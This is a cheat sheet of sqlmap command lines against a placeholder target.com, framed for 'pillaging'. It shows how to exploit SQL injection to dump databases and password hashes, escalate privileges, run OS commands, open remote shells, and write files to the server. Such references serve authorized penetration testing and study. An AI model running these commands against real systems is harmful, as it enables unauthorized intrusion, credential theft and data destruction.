# SQLMap-Cheat-Sheet
Target the http://target.com URL using the “-u” flag:
sqlmap -u 'http://target.com'
Specify POST requests by specifying the “–data” flag:
sqlmap -u 'http://target.com' --data='param1=blah&param2=blah'
Target a vulnerable parameter in an authenticated session by specifying cookies using the “–cookie” flag:
sqlmap -u 'http://target.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'
Drop all Set-Cookie requests from the target web server using the “–drop-set-cookie” flag:
sqlmap -u 'http://target.com' -r req.txt --drop-set-cookie
Perform in-depth and risky attacks using the “–level” and “–risk” flags:
sqlmap -u 'http://target.com' --data='param1=blah' --level=5 --risk=3
Specify which POST or GET parameter to target using the “-p” flag:
sqlmap -u 'http://target.com' --data='param1=blah&param2=blah' -p param1
Choose a random User-Agent request header using the “–random-agent” flag:
sqlmap -u 'http://target.com' -r req.txt --random-agent
Target a certain database service using the “–dbms” flag:
sqlmap -u 'http://target.com' -r req.txt --dbms Oracle
Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:
sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
Attempt privilege escalation on the target database
sqlmap -r ./req.txt --level=1 --risk=3 --privesc
Run the “whoami” command on the target server.
sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
Dump everything in the database, but wait one second in-between requests.
sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
Here are some useful options for your pillaging pleasure:
-r req.txt Specify a request stored in a text file, great for saved requests from BurpSuite.
–force-ssl Force SQLmap to use SSL or TLS for its requests.
–level=1 only test against the specified parameter, ignore all others.
–risk=3 Run all exploit attempts, even the dangerous ones (could damage database).
–delay Set a delay in-between requests, great for throttled connections.
–proxy Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.
–privesc Attempt to elevate the privileges of the database service account.
–all Enumerate everything inside the target database.
–hostname Print the target database’s hostname.
–passwords Find and exfiltrate all users and their password hashes or digests.
–dbs Enumerate all databases accessible via the target webserver.
–comments Enumerate all found comments inside the database.
–sql-shell Return a SQL prompt for interaction.
–os-cmd Attempt to execute a system command.
–os-shell Attempt to return a command prompt or terminal for interaction.
–reg-read Read the specified Windows registry key value.
–file-write Specify a local file to be written to the target server.
–file-dest Specify the remote destination to write a file to.
–technique Specify a letter or letters of BEUSTQ to control the exploit attempts:

    B: Boolean-based blind
    E: Error-based
    U: Union query-based
    S: Stacked queries
    T: Time-based blind
    Q: Inline queries
